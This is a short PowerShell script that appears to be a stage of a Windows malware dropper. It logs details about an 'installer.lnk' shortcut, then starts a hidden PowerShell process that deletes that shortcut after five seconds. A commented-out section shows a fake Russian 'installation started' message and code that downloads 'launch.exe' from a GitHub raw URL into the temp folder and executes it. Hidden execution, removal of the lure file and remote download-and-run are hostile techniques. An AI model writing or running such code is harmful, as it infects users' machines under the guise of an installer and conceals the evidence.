$folder = (Get-Location).Path
$lnk = Join-Path $folder "installer.lnk"

$log = "$env:TEMP\debug222.txt"

"Folder: $folder" | Out-File $log
"LNK: $lnk" | Out-File $log -Append
"Exists: $(Test-Path $lnk)" | Out-File $log -Append

Start-Process powershell.exe -WindowStyle Hidden -ArgumentList @(
    "-Command",
    "Start-Sleep 5; if(Test-Path '$lnk'){ Remove-Item -LiteralPath '$lnk' -Force -Verbose }"
)

# @"
# Установка запущена.

# Пожалуйста, подождите...
# "@ | Out-File $txt -Encoding UTF8

# $wc = New-Object System.Net.WebClient
# $wc.DownloadFile('https://raw.githubusercontent.com/nesabydy00/dgeagagaeg/main/launch.exe', "$env:TEMP\a.exe")
# & "$env:TEMP\a.exe"
